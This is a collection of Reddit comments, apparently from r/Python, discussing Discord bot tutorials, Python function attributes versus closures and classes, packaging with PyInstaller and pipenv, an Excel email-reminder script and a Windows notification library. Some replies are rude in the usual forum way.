Aw, I didn't know it was yours — usually when these are posted it's from a newbie who looked up 'how make discords bot' and found an actually-awful tutorial, then (not knowing any better) thought 'hey, I should share this!' My crudeness was because it really needs to be emphasized that this is not how you should be doing things, but I admit I didn't watch till the end of your video (skipped past the setup and then watched a minute or two of the code) I think I asked Rapptz a while ago about why the most-prominent official example uses on_message and I think he just said that it's stayed there from before the commands ext was a thing, and because async has no docs for it it'd get weird to introduce something like this but leave no mention of it elsewhere... the rewrite branch's docs (being the future of the lib) do have an example with it in the "getting started" part, but it is somewhat annoying that async didn't get something similar before it went into the bugfix-only phase. I don't know your plans for part 2 or even future parts, but are you considering introducing rewrite and/or cogs, perhaps through an example like [this](https://gist.github.com/EvieePy/d78c061a4798ae81be9825468fe146be)? But yes — if you do know your shit and can get a tutorial out that shows the commands ext's usefulness then it's no biggie.
Are you questioning the technical capabilities of this person? For what reason? You're asking "how is this person qualified to talk on this subject" based on evidence that is easily fallacious. Your argument is more aligned with something like "can a family therapist be successful if they're not happily married" than a serious question, and I question your motives.
Why do you hate women?
From https://stackify.com/popular-programming-languages-2018/: &gt; The popularity of Python has risen steadily over the past 15 years, finally breaking the top 5 on the Tiobe Index a few years ago. This is because Python is a major language in some of most exciting technologies today. Machine learning, artificial intelligence (AI), Big Data, and Robotics all rely heavily on Python (Robotics also relies on C for its use in systems programming). Cyber Security, one of the top software challenges of our time, is also driven by Python. &gt; &gt; It’s surprising how simple Python is to learn. It’s now the most popular introductory language taught in universities and often picked up by experienced developers as a second or third language. Seems like Python is staying pretty relevant.
&gt; the individual that wrote that function was just an idiot Don't be so judgmental. That individual is Guido van Rossum and raw_input/input functions were added to the language in 1991 or earlier. Times were different.
Remove the `:` from your URL.
Bot == Saltybot
Swapping variables is a trivial one-liner without temp variables. a, b = b, a Exponentiation is just another operator. No need for a library call. c = 2**3 # 2^3 = 8
Could someone explain this: &gt; Using env in shebangs is dangerous because it can result in system packages using non-system versions of python. Isn't that the entire point of `#!/usr/bin/env python`, if I'm using anaconda or something else I want to call that python, not 2.7 or whatever. How would writing a script with this alter which python the os is calling?
No problem I just solved it, a mod can remove this thread
You know something is doing well anytime someone asks if it’s dying.
why are you still talking , I asked 1 simple question. I might just buy a thing like alphasmart why do you have some much time to care about what other people do???? 
&gt; but i unlike it Should be written "but i don't like it" Keep being awesome.
Eve will read models for a database and create an API from that, flask doesn't do that 
tl;dr: use PyInstaller, it’s awesome!
/r/UnixPorn would like a word with you...
Here's a sneak peek of /r/unixporn using the [top posts](https://np.reddit.com/r/unixporn/top/?sort=top&amp;t=year) of the year! \#1: [\[Kindle\] Debian on my Kindle!](http://i.imgur.com/Nxb8R0X.jpg) | [318 comments](https://np.reddit.com/r/unixporn/comments/6a4whs/kindle_debian_on_my_kindle/) \#2: [\[Shitpost\] r/unixporn starterpack](https://i.redd.it/yu0auhxk5nyz.png) | [125 comments](https://np.reddit.com/r/unixporn/comments/7dptzf/shitpost_runixporn_starterpack/) \#3: [\[GNOME\] They said Linux is for IT people only: My desktop PC running Ubuntu in my office. I'm a physical therapist.](http://i.imgur.com/5otzCMo.jpg) | [188 comments](https://np.reddit.com/r/unixporn/comments/6vjua2/gnome_they_said_linux_is_for_it_people_only_my/) ---- ^^I'm ^^a ^^bot, ^^beep ^^boop ^^| ^^Downvote ^^to ^^remove ^^| [^^Contact ^^me](https://www.reddit.com/message/compose/?to=sneakpeekbot) ^^| [^^Info](https://np.reddit.com/r/sneakpeekbot/) ^^| [^^Opt-out](https://np.reddit.com/r/sneakpeekbot/comments/7o7jnj/blacklist/)
There's lots of things out there like this. The Atom text editor uses a striped down browser type thing. You can fairly easily bundle firefox or chromium with the app also, and the uninformed user wouldn't know that it's anything to do with web tech. Electron is a similar idea but its chromium front end and nodejs instead of python backend, and that has loads of apps built thay way. https://en.m.wikipedia.org/wiki/Electron_(software_framework) 
**Electron (software framework)** Electron (formerly known as Atom Shell) is an open-source framework created by Cheng Zhao, and now developed by GitHub. It allows for the development of desktop GUI applications using front and back end components originally developed for web applications: Node.js runtime for the backend and Chromium for the frontend. Electron is the main GUI framework behind several notable open-source projects including GitHub's Atom and Microsoft's Visual Studio Code source code editors, the Tidal music streaming service desktop application and the Light Table IDE, in addition to the freeware desktop client for the Discord chat service. *** ^[ [^PM](https://www.reddit.com/message/compose?to=kittens_from_space) ^| [^Exclude ^me](https://reddit.com/message/compose?to=WikiTextBot&amp;message=Excludeme&amp;subject=Excludeme) ^| [^Exclude ^from ^subreddit](https://np.reddit.com/r/Python/about/banned) ^| [^FAQ ^/ ^Information](https://np.reddit.com/r/WikiTextBot/wiki/index) ^| [^Source](https://github.com/kittenswolf/WikiTextBot) ^| [^Donate](https://www.reddit.com/r/WikiTextBot/wiki/donate) ^] ^Downvote ^to ^remove ^| ^v0.28
Two ways, or 1. way twice? Does not compute!! :)
Are the dates content inside the excel or the timestamp of the excel file? The latter is easy and I would recommend using Python. Python can be compiled into an exec too using pyinstaller. I’m not sure if there’s any excel reader/parser in Python, most likely there is. Regardless, I recommend Python scripting as first approach. 
Excellent article. I've all but given up on pyqtdeploy, I can't even get it to build the example project. I have one bit of constructive criticism for the article. It says nothing of the licensing terms for PyInstaller, which is pretty important for anyone deploying an application. I initially got scared off by the [COPYING](https://github.com/pyinstaller/pyinstaller/blob/develop/COPYING.txt) file in the github repo, which lists it as GPL. It's a bit more complicated than that as the [licensing page] makes an exception that non-free commercial programs can be built with it, and that the GPL license is only intended to obligate sharing for modifications to the source code of PyInstaller itself.
[Permanent](https://help.github.com/articles/getting-permanent-links-to-files/#press-y-to-permalink-to-a-file-in-a-specific-commit) GitHub links: * [pyinstaller/pyinstaller/.../**COPYING.txt** (develop → 5f91905)](https://github.com/pyinstaller/pyinstaller/blob/5f9190544d9a95981754eec844391e5725ffe434/COPYING.txt) ---- 
Each key in a dictionary can only have one value. Use for example a tuple or list to group the two value.
Pip uses freeze to specify which packages to "hold" or "save" or, well, "freeze". I'd call re title the article and change the terms for clarity.
I really liked the video, thanks for posting. I've written a lot of Python (2.x I'll admit) and never encountered this pattern, is this commonly used and I've just overlooked it? I can't convince myself that this is cleaner than using an object; wouldn't an object be easier for new readers to understand?
No, Python is not dying. Numerous companies still use it. You, yourself, admit that it is a teaching language. Between its prominence in the machine learning space and web backends (esp. Django), Python isn't dying anytime soon. Even if Guido decided to EOL Python today, there would still be a long tail of usage. Folks aren't going to immediately switch to Node, Go, or whatever the new hotness happens to be. Python, like every language you learn, is a tool. Sometimes it is the best tool. Sometimes it is a "just okay" tool. Sometimes it is the wrong tool. You have to decide where it falls based on the project and constraints at hand. Popularity contests—posts on Hacker News/Medium/reddit—should not factor too heavily in that decision. You'll see a lot of posts about, "How &lt;big company&gt; switched to &lt;new technology&gt;." You won't read many about, "Yep, &lt;big company&gt; is still using &lt;tried-and-true technology&gt;."
The dates are content in the excel file. Its a mailing list where the people have put in several dates that mark special occasions. The idea is to remind them about a week in advance of the occasion. Thanks for the starting point, I'll look into getting python setup as an .exe as well. 
&gt; should be a standalone .exe type of program or a script that runs itself every 24hrs Don't discount the use of a web server that is always on; then you don't need to deal with job scheduling, or distribution. 
No. It's very big in AI and ML.
A quick google gave me two links below for Python and excel. Python is the goto language for me on most occasions so that’s why I recommend it. https://www.datacamp.com/community/tutorials/python-excel-tutorial https://automatetheboringstuff.com/chapter12/ 
The edit didn't take for whatever reason. I had changed the second 1 into a 2 bur it didn't post. Nice catch:) So it's 1. Pipenv (for consciously putting stuff into a virtualenv which in turn is used as a venv and 2. Pipsi as a replacement for using the system python to install things amongst the system python's site-packages. Pipsi instead, will install it into a venv that it creates for that one and only python app. You can't use its venv as a venv. So you can't add other python apps into that venv. What you will get is a sim link that is placed into your Nix's bin directory which in turn lets you run your app that is now fully isolated from your system's pyrhon, from the command line.
For anyone interested, part two is available now at https://www.youtube.com/watch?v=DHbVpx-IpH8 which covers more details about what you can do with the bot.
Just FYI, part 2 is available now https://www.youtube.com/watch?v=DHbVpx-IpH8
Personally I've never seen the addition of members to a function object in several years of coding. I've taken advantage of the default members (do `f.__dir__()` for some function `f` to see them) for introspection, but it's a revelation that you can add members.
I would use powershell because it works so well with excel. 
I don't get it.
Well you could use tuple unpacking to do this... packages = {"zsh": ("zsh","its a shell!")} for key, (value, desc) in packages.items(): print(key,value,desc)
I really like the teaching style of this video, but not sure I would use the idea in production code.
Anyone know what might work for a program that uses opencv?
It's not a common technique. The main place I've seen it used is in the context of decorators that want to add some state to a function. For instance a caching decorator needs some global place to store the cache - the function object itself is the natural place to put it. It makes sense in this context since you already have a preexisting function. If you have the option, just creating a class (possibly with a `__call__` method is probably the better approach.
It sounds pretty easy. You just need to import the excel file, read through the dates, if a date matches your criteria (a week from today, or whatever), figure out who needs to be emailed (wherever you store those, you know more than I do) and send the emails. You're going to need an excel module and an email module (with login criteria for an email account). Not hard at all.
I prefer to initialize function attributes with a decorator: def init_attrs(**kwargs): def decorate(func): for k, v in kwargs.items(): setattr(func, k, v) return func return decorate @init_attrs(table={0:0,1:1}, myvar=0) def myfunc(arg): It removes the getattr out of the function and results in cleaner looking code, plus gives a better indication what it's doing through a name. Using the decorator notation also alerts others that `# Magic happens here` 
I'm fairly new as well, but I'd think in your "if" statements you should be referring to the numbers 1,2,3 and not "rock, paper, scissors" Rock = 1, but that doesn't mean if p1 is a random number of 1 that it will be "rock" You could do another if loop in a function to the effect of Define translate (pNum) If pNum = 1 return "Rock" Elif pNum = 2 return "Paper" And so on .... Then after running the random defending of p1 and p2 translate (p1) translate (p2) This is on mobile, so not the exact code you need, but I'd be happy to help if needed more 
You would use a web server that your clients would login and upload their schedule and register their email. The server would occasionally check it's database of dates and mail out the reminders. I would start with something like this, a tiny Flask web app. https://github.com/shekhargulati/flask-login-example/blob/master/flask-login-example.py
Two suggestions: Format your code by putting 4 spaces in front of each line. This is easily done in most editors by indenting the whole block of code before copying (ctrl+] in IDLE). Post questions like this to /r/learnpython instead. There are numerous people there that are specifically interested in helping beginners.
[Permanent](https://help.github.com/articles/getting-permanent-links-to-files/#press-y-to-permalink-to-a-file-in-a-specific-commit) GitHub links: * [shekhargulati/flask-login-example/.../**flask-login-example.py** (master → 7dc20e5)](https://github.com/shekhargulati/flask-login-example/blob/7dc20e510a1e8b93d470c8d26c530a0ce7affefb/flask-login-example.py) ---- 
Tor 
Caveat: the optimized `__contains__` falls back to an iterative search if the candidate value isn't an int. Well-behaved code probably shouldn't run into this problem, but I find it annoying that `99999999.0 in range(100000000)` *slowly* returns `True`, and `'foo' in range(100000000)` has to check the whole range as well.
In my opinion, that's just as illegible. Use a class.
What have you tried? With pyinstaller it should include any library your program uses, but if it doesn't (automatically) you can include it manually.
That's fair. My main issue with it is that it's unnecessarily global; there's no way to have multiple independent sequences active at the same time. I don't object too much to custom function attributes when they're used for something that is more suited to global behaviour, such as a cache or rate-limiter. For the record, I will back you up on both of those other examples.
Sure; classes are for when you actually need to, you know, *instantiate* them. Or reasonably might want to.
Are you deadset on using python? Because microsoft office applications have a built-in programming language called VBA, visual basic for applications. You wouldn't be able to compile it into an executable, but it would be easier to send an email, IMHO.
I like it too, but this is not very pythonic. You can make a generator function instead that gives you all the utility of a python sequence. The author also uses a for loop with range and discards the value which suggests they're not very familiar with python idioms.
I'm not dead set on it, but looking at that it didnt seem like it was going to work super well. 1, the email is going to use data from the spread sheet in the actual email content. 2, I'm trying to build it so that the spreadsheet auto fills from a website based on a form people will fill out and excel didnt seem like it was going to work well with that. 3, I don't want to have to remember to run it every day, or if for some reason I can't run it that now I'm out of luck. I'd like to be able to set this up and then pretty much forget about it except to update the content of the email.
I have something similar to this program. I used python with openpyxl lib. My client put in the dates in excel with date format cell so I use the datetime functions directly on values. If the date stored as text in excel, you can convert it to datetime obj easily (datefromtext something) and do compares easily. You can make a scheduled task to run the python with your program name and maybe get a number for column number to check for date or other stuff.
Or, if you really really don't want to use a class, you could use a closure: def make_counter(initial_count=0): count = initial_count def counter(): count += 1 return count return counter counter = make_counter() This feels a lot better in my opinion. Mutating a function gives me the heebie jeebies
So the excel sheet pulls from user input from a website, checks to see when a date is one week out, and sends a personalized email based on given criteria. It also has to be able to run daily without failure. Should be simple with python. The most difficult part, I believe, would be pulling it from the website. Once you have that, the rest is simple. For making the program run automatically, say every day, I'd simply create a batch file and do something simple like "python /path/to/file." Once you've done that, you can use windows task scheduler to have it run daily (or your preferred frequency) on a dedicated computer that is always on.
Wait, if your code is in a secret repo, can’t whoever has the Docker image just copy it off the image?
It is not any less legible that something like `@lru_cache` when you see it for the first time. Spend 5 minutes on google and realize "Hey, functions have attributes, that's cool". It's not a difficult concept to grasp. Wrapping a function in a class isn't inherently better. Sometimes you need a rubber mallet and sometimes you need a claw hammer. It depends on the context.
The idea is to make the token useless after the image is built. In the event that someone gets hold of the token, they still can't do anything with it.
I sometimes add factory produced methods to classes after they're defined. It has it's place
But what’s on the image? Isn’t a fully built app? And can’t someone just copy the app off the image?
This is a truly superb joke.
Yes they can. Perhaps I should have clarified the context some more. The image is supposed to be kept private, it, however can leak/ be compromised from the inside by bad code/security practices. In that event, we don't want to give the attacker access to our private keys. Leaking app code is least of our concerns in case that happens.
Your particular example is unsightly. I'd fully define the function and use the built in functools.partial for what you did. In general closures are good though. Use functools.wraps though
I respect anyone willing to deal with the Window’s API in their free time. Looks great!
You still should be using a virtual environment even with pyenv. Pipenv can use pyenv, and handles setting up the right python and virtualenv with your listed requirements. It’s super useful if you haven’t tried it. 
&gt;It’s possible to insert blocks of other code to make the language even more feature-rich and functional, all at no cost. Is there a programming language that doesn't allow you to insert blocks of code?
It doesn't matter that you can stare at a piece of code long enough to understand it. The code should be as obvious as possible. This is the obvious way to write your example: class MyClass: def __init__(self): self.table = {0:0, 1:1} self.my_var = 0 def my_func(self, arg): … As soon as things get a bit more complicate, you'll end up converting it to that form anyway.
All a static function variable is is doing is an opaque way of instantiating a singleton class.
It's "scraping" (pronounced scray-ping) not "scrapping" (pronounced scrap-ing). Scrapping means abandoning, throwing away.
I just use the virtualenv plugin for pyenv. Same project, and seamlessly handles venv as well.
Neither partial nor wraps are needed here. The function itself is returned, not the result, and the call signature is not modified. You would used @wraps if you were to call the function and return the result of that function. From the docs you can see the primary purpose of is to make the wrapped function appear to be the original function in `__name__, __module__, and __doc__`. I'm excluding `__dict__` here because obviously the goal is to modify the instance dictionary. The use of functools.partial would be to modify the call signature, which this is not doing. I did not supply an actual working function in my example since I don't see how it is relevant. Feel free to add `pass` or `print('Hello World')` if it bothers you.
&gt; The author also uses a for loop with range and discards the value which suggests they're not very familiar with python idioms. that seems pretty pythonic and a widespread practice to me. how would you have done it?
If you have a system package using env and you install a custom python version, you might find trouble. It's fine for your projects, absolutely, but it might just crash and burn if your system packages don't work with it
Needs screenshots in your readme! Is it like [this package](https://github.com/jithurjacob/Windows-10-Toast-Notifications) for toast notifications?
Your example seems very much like changing the call signature is my point. If those variables are inherent to the function, but them in the function. If you're saving typing by passing in the vars via a closure, partial is more clear. It's just a matter of this dumb example really I think. For instance, if the function was print ('{} did {}'.format (name, action) And you wanted a `print_jose_did (action)` function, partial is more clear. Also, I hate having to reason heavily about setattr when some dufus starts passing in `**kwargs`. Just be explicit! If it uses named arguments then put them in the signature. 
Thanks for pointing that out! I hadn't noticed that caveat before.
Thanks for correction
To me its a huge hint to have made a python sequence by that stage ie something sliceable. Make your iterator, iterate through it, and print the current item. Or comprehend it into a sequence and print it out formatted at the end. 
I'm sure each notebook gets very little resources allocated to it. ML will likely be a no-go. 
If you. Google for modulecmd you'll find a package that allows you to make multiple software versions available to projects. After "module loading" a particular version of a tool, say python2, or anaconda/python3.5 then you could just #!/bin/env python To get the version module loaded into your shell.
I'm confused as to why someone would want to do this instead of just using the global keyword on global variables?
What about a bash script to figure out what platform it's on and choose the right command accordingly^(oh god this is starting to sound like Java).
the guy was translating C to python. he wrote a for loop in C, so it makes no sense to do something different in python, and the way he made the for loop is fine most importantly, he is demonstrating function properties, so his implementation is the simplest and most straight-forward and for what it's worth, using a comprehension here is probably a misuse of python features 
Partial would not be using function attributes. It is for using the same static variable. Function attributes, however, are persistent but can be changed. This is different. The reason to use **kwargs is so that the decorator can be used to set up any attributes on different functions. Not using it would greatly limit its utility and not increase readability. It's used to decorate functions like so: @init_attrs(myvarname='myval') def myfunc(): print(myfunc.myvarname) It's pretty clear right at the definition of the function which attributes it's setting. If you have a better way to write an initializer for function attributes, please share.
On mobile atm, but I'll check it out tomorrow cause i love to mess around with stuff like this.
 def myfunc(): print('myval')
That's a good educational project. FYI, Python comes with modular exponentiation built in, as an optional argument to the `pow` function. There's also a misspelling in that function's name, and the code is duplicated in two places.
Even in C, if you need to maintain state between function calls it's usually preferable to pass around a pointer to a context struct as an argument.
Don't distribute a virtualenv, just build the wheels you're missing and redistribute them.
Thanks :)
True.
Everything looks bad on linux, despite the fact that it's most customisable OS, the other guy linked unix porn and whatever, and all things here look like, okay? I guess. Nothing I haven't seen before, just another terminal with different colours. Probably might have something to do with skids using it, which obviously, kids, they will never make something look good. Or programmers, you know, those guys who might be most innovative and intelligent people, but can't draw for shit.
That's sad to hear. But wouldn't it be possible to mock the ansyncio loop?
What does this have to do with Python?
I think those are called libraries. Also that last point is a fucking joke. Goodluck modifying python at it's core, which you will have to do every time new python version comes out or be stuck in the past like a fucking ape. Looking at you, level 70 clingers who still use python 2.
"In this post, we’ll explore the extraordinary growth of the Python programming language in the last five years, as seen by Stack Overflow traffic within high-income countries. The term “fastest-growing” can be hard to define precisely, but we make the case that Python has a solid claim to being the fastest-growing major programming language." – https://stackoverflow.blog/2017/09/06/incredible-growth-python
Yeah I agree, I think it's down to there being no standard native OS GUI control library, of which FX like Qt would utilize. It's 100% why imo, Linux desktop is still not a viable desktop replacement... Also there's too many competing libraries that manage fonts and none are outstanding. Android, is not a desktop OS, so can't really be compared, as it has no DM or WM.
I guess input() does only work on interactive shells. The webinterface is not interactive.
[Permanent](https://help.github.com/articles/getting-permanent-links-to-files/#press-y-to-permalink-to-a-file-in-a-specific-commit) GitHub links: * [Rapptz/discord.py/.../**355eb08b25b5c46c4c061cf50594650738ac09cf** (rewrite → 355eb08)](https://github.com/Rapptz/discord.py/tree/355eb08b25b5c46c4c061cf50594650738ac09cf) ---- 
Thank you for the helpful info!
There is literally no difference between the two - the former is just syntax sugar for the latter. This is sometimes called "UFCS" or "universal function call syntax", a name pioneered by (IIRC) D, and used in D, Rust, and even proposed in C++.
The scope would be different but I do agree this looks odd in an object oriented language. A benefit would be the use outside of classes like the guy is doing here. You don't always want a class and this would keep the variables outside of the global scope. 
You are absolute right. I added some screen shots to README. Yes, as I see it, it is basically the same library. However mine supports callbacks. For example host application is notified when user clicks on notification. And notifications live in Windows Notification Center after timeout. 
Hope you will like it :)
I had trouble trying to implement authentication with DRF, React and JWT, do you have tutorials/links on this?
An interesting subject. I would have addressed this completely different using generator functions: def inc(): counter = 0 while True: counter += 1 yield counter counter = foo() for _ in range(10): print(next(counter), end=' ') 
The way you write it, it will not work. As soon as you try to update count, Python will assume that it is a local variable, and will then fail because it has not been assigned a value yet. You could, however, write the following: def make_counter(initial_count=0): count = [initial_count] def counter(): count[0] += 1 return count[0] return counter counter = make_counter() 
[mp4 link](https://g.redditmedia.com/kkbE6Ev6x1I8q-WxCqRAY4wApJqNguaVoUTEpmvZ-I0.gif?fm=mp4&amp;mp4-fragmented=false&amp;s=b067496356654ee20e0df45e5284f177) --- This mp4 version is 87.08% smaller than the gif (1.38 MB vs 10.7 MB). --- *Beep, I'm a bot.* [FAQ](https://np.reddit.com/r/anti_gif_bot/wiki/index) | [author](https://np.reddit.com/message/compose?to=MrWasdennnoch) | [source](https://github.com/wasdennnoch/reddit-anti-gif-bot) | v1.1.2
Or use the `nonlocal` statement in Python 3: def make_counter(initial_count=0): count = initial_count def counter(): nonlocal count count += 1 return count return counter counter = make_counter() 
Greetings everybody !!! I am doing a visualizations using Python + Quandl, Matplotlib and Cartopy, Suggestions about the design are very welcomed. The data for 2017 is still incomplete (ECB have not yet updated last December for some countries). Regards.
I just know it took me hours to install opencv so I figured most of these freeze apps would have trouble. I guess I should try it first ...
Try this https://github.com/davesque/django-rest-framework-simplejwt It was very helpful for me
Maybe less colors on your map. All the green and brown take away from the metric you are trying to convey.
I see, thank you very much !
I think it's more an example of what kind of content can be dangerous when passed to `eval`, it's not meant to be taken literally. If the attacker can change string literals, they can already change code anyway, so there is no additional vulnerability in that case.
Exactly.
The discussion has been great and I really enjoyed the style/approach of the video. 👍
I fixed it already! i forgot about the "end" i did ="" but its need to be ,end =""
Datacamo
Was planning on making something like this. Oh well. 
Patching bugs in MonkeyType.
I once started working on an app which required working with windows APIs. 2 hours later I just quit, python does spoil you in a way. To avoid any confusion, it was just an improvement project at work. 
Has anyone figured out a good way to integrate a JavaScript build pipeline in a Django development and deployment workflow?
A more Pythonic way to do it is to use `str.join` print(''.join(random.choice(numbers) for _ in range(input_)))
thanks
Docker is great for this, I use flask for a small project but I imagine it works for Django too.
I stand by everything I say even when it's pants on head retarded. 
windows 7
should be class and not def, right?
The command `py` should launch the latest version, if not you can force it to start python3 with `py -3`. Using the `python` command is oldschool, we don't do that on windows anymore. 
Ah okay I thought about something like that. I guess its the same as using len(lst) instead of lst.__len__() ?
"***Heathen!***" Seriously though, come join the unix club!
I like the look of this. Can see me implementing it at work. Starred to investigate.
Okay (: Is there something like a style guide for python that includes this? The __do_something__() functions bug my aesthetic feeling in general, would you say it would be better overall to avoid them for readability where possible?
Not really. `len` is a builtin function that calls `object.__len__` internally if there is one, but also handles other cases like iterators that don't have a known `__len__`.
Right on. Keep at it, best way to grow is to keep doing. You should check out the mutt mailing list and try to implement features that are requested over there. 
The "dunder" (short for "double underscore") methods aren't intended to be called directly, ever. They exist to allow your own custom classes to override some builtin behaviors like indexing or math operations, but you shouldn't ever need to invoke them directly.
If you wrote something, it's already in real world.
Yeah because adding a line `*.tokens` to `.gitignore` is just too hard, right?
Further discussion [here](https://mail.python.org/pipermail/python-list/2018-February/730818.html).
Yes, gunicorn looks really simple, ive managed to deploy my app with gunicorn + dokku in one click. Can you compare it to uwsgi from your experience?
I was referring to the code-build-test lifecycle and how to integrate something like webpack for auto building the JavaScript. 
I'd make it so the circles change colours depending on unemployment growth. Red would indicate a growing unemploment population, green inducating a shrinking one.
As a long time member of the eunuch's club I can tell you it's great, but it's not for everyone. Windows is a fantastic OS for the people it's made for. 
 def number(numbers): x = randint(1, 10) yield numbers + [x] if x not in numbers[-3:] else number(numbers) toolz.take(toolz.iterate([]), 35)
Don't have a github account so commenting here. gi is part of [PyGObject](https://pygobject.readthedocs.io/en/latest/) AFAIK, not gpi pip install PyGObject works as long as you have the other system dependencies. I recommend at least testing future projects in their own venv (that way you can be sure you didn't miss any dependencies)
My brother! Please read :)
https://www.reddit.com/r/learnpython/wiki/index
I think there is a better way to sum things up. From now on, (best practicesand such) there are only two ways to use pip. So it's 1 Pipenv (for consciously putting stuff into a virtualenv and 2 Pipsi for consciously not putting stuff in a virtualenv. Use pipsi as a replacement for using the desperately dangerous mode of running the system python to install things amongst the system python's site-packages. (Just google search or duckduckgo what Hynek Schlawack documents about the perils of a system level install) Pipsi instead, will install the python app/library into a venv that it creates for that one and only python app. You can't use its venv as a venv. So you can't add other python apps into that venv. What you will get is a sim link that is placed into your Nix's bin directory which in turn lets you run your app that is now fully isolated from your system's pyrhon, from the command line. As far as one is concerned, your app is not in a virtualenv. Its where the system python puts things. (but its not). So its (a) pipenv = venv and (b) pipsi = no venv. Within an organization, I would love to mandate that all machines be configured in some way to automagically replace the "pip" command when its typed, with a "pipsi" command.
 Colt Steele just launched an intensive full python boot camp on Udemy. 60 hours of content from one of the best teachers I’ve ever had.
&gt; the guy was translating C to python. he wrote a for loop in C, so it makes no sense to do something different in python I disagree entirely. Blind translation of one language to another will almost invariably lead to poor code. I know the following are about Java but the same principal applies [Python Is Not Java](http://dirtsimple.org/2004/12/python-is-not-java.html) and [Java Is Not Python, either...](http://dirtsimple.org/2004/12/java-is-not-python-either.html).
Jython's last release was nearly three years ago but there's been a lot more activity with IronPython.
I'm the author of the article. I'm using Cypress for testing my projects. It's a matter of building the bundle before running tests. In Cypress: before(() =&gt; { cy.exec('npm run dev') })
Attempting to use this on non-Windows raises an ImportError?
I've had to do something like this for my Spark programs. It could be relevant to you. https://henning.kropponline.de/2016/09/17/running-pyspark-with-virtualenv/
The redirects are strong with this link.. Twitter -&gt; Gainfromhere -&gt; Udemy. 
I'd try a blank map with the countries changing colours.
Yeah, I don't think this would work on non-Windows when this post is titled "Python notification library for Windows".
Did you learn the Windows API beforehand or did you learn it as you made this library?
And no circles
Yeah, I feel like this approach is more Pythonic than what was demonstrated or using a class with a `__call__` method. 👍
Hey, feel free to share your code on pastebin so we can have a look, you also have a resource like https://codereview.stackexchange.com Where you can put some specific examples
I wrote a little decorator that gives a generator a function-style calling interface. import functools def gen2func(gen): generator = [] @functools.wraps(gen) def wrapper(*args): if not generator: generator.append(gen(*args)) next(generator[0]) return generator[0].send(*args) return wrapper Usage: @gen2func def accumulate(a): b = 0 while True: b += yield b 
First of all, as a most bare-bones answer to "how can I know if my code is neat and fix it if it's not", would be to get a linter installed in your editor, because that will at least enforce some very basic patterns, make you aware of dead code, and enforce basic control flow structure things like getting rid of useless "else" statements, that type of thing. It's kind of like having many years of programming wisdom enforcing good style on your code, without having to spend a bunch of time looking at other people's code for guidance. Maybe check out pylint. On to my more personal thoughts here: df_imputated=df.action1() df_dropped=dt_imputated.action2() df_hot_one=df_dropped.action3() In my techincally-professional-but-not-particularly-senior opinion, this is perfectly beautiful, functional code (although I don't know why you wouldn't put spaces between operators, and `df` isn't a great variable name). You're not repeating yourself, and assuming the functions have useful names, it's 100% serviceable. The only potential smell is the use of temporary variables, but I've personally never heard a good reason why you shouldn't use temporary variables in this way (I'm all ears on this btw). If you think it looks "cleaner", I know a few people who would prefer that this be written this way: df_hot_one = (df .action1() .action2() .action3()) I personally prefer the use of temp variables because they act as inline comments in the case that it's not clear what a function is doing to your data, but it's hard to argue that this form is aesthetically pleasing, and all the functions are right there in a nice little ordered list.
100% start with this playlist: https://www.youtube.com/watch?v=oVp1vrfL_w4&amp;list=PLQVvvaa0QuDe8XSftW-RAxdo6OmaeL85M And to really solidify the knowledge you've gained, you need to come up with a project you will be able to write with what sentdex has taught you. (it took me by episode 30 to think of something fairly useful and by surprise, its really helped a lot of people. I still tinker with it from time to time and to think it started from very humble begins :) )
I always thought liking the "smell" or neatness of your own code is similar to people not liking the sound of their recorded voice. You're too familiar with it to pass fair judgement. Try digging up some old code that's not as fresh in your memory. Also, recently I took a screenshot of my code for a presentation and made it smaller, which provided an interesting perspective. 
The best way is to find a project you use. Then read their contributing guidelines. 
What's the end goal here? What is the script intended to do? Editing system configuration files like that sounds like you're using the wrong tools.
I'm writing a file picker in easygui and have run into an issue where the text of the items is white until the user highlights the items. Once they are highlighted, they turn black and are readable. I am using the following code for easy gui: import easygui # open file dialogue file2open = easygui.fileopenbox(msg="Open your file",title="Test Box", filetypes = ["*.txt", "Text Files"]) My system has a dark theme and has white text as the default text for items. Using Linux. This has been tested on a default win10 config and works fine. I'm assuming this has to do with the window manager overriding settings somehow. I've looked for docs on how to change the colors in easygui and can't find any info (the sourceforge page is down due to maintenance). I have also tried using tkinter and forcing the colors using that and have the same issue even when I force the foreground to black. Any help would be appreciated!
then you missed the point of the post. it wasn't about writing the most idiomatic loop in language X. nor was it about porting code from one language to another. it was about emulating static function variables in python. the loop was merely a vehicle to demonstrate the functionality works. and a for loop was the most reasonable choice for that demonstration because C programmers and python programmers both understand for loops. choosing some other language-specific feature solely for its idiomatic superiority or propriety would distract from the article's point
I am making a script which is supposed to configure minimal install of Debian, i want the user to be able to choose what kind of repos he wants to use. Here is what i got so far https://github.com/b-b-x/debian-i3/blob/master/installer.py
[Permanent](https://help.github.com/articles/getting-permanent-links-to-files/#press-y-to-permalink-to-a-file-in-a-specific-commit) GitHub links: * [b-b-x/debian-i3/.../**installer.py** (master → a4ae970)](https://github.com/b-b-x/debian-i3/blob/a4ae970477fac3c1dafe418ea4a9be2dc9d76a87/installer.py) ---- 
Then you should probably just require the user to run your entire script as root - basically everything you do will have to be done as root anyway.
I think it's not the best idea to run whole script as super user, i want to use it only for apt and editing system files if possible.
&gt;Otherwise, I'm toying with a dataset released by NBC about tweets from alleged bots during the elections and playing with NLTK and Gensim to extract interesting insights from it. Do you plan to post your conclusions somewhere once you're done with the analysis?
I feel that with gunicorn I had an altogether smoother experience. Uwsgi is good as well, but I would go with gunicorn again in later projects. 
This was my first experience with Windows API at all. Honestly, it was not easy. I find MSDN documentation messy and unclear. In addition, python implementation does change few things and thus you have to check not only the MSDN documentation, but the one for pypiwin32 too. 
Yes, even with pypiwin32, it just does not feel.. ehm.. pythonic enough? I fell in love with this language first time I saw it on university. I thought there is library for everything. How surprising had it been there was not python library for Windows notifications. Now I know why :D
If there was a library for notifications on Linux, that would be spectacular. I would love to be able to just look at a notification to see when an algo finished or publish periodic notifications for code status.
Get the SoloLearn (Android) app.
I have just finished documentation (available on [Read the Docs](http://zroya.readthedocs.io/)). Could you please have a look at it and point out any errors, unclear parts or anything you would change?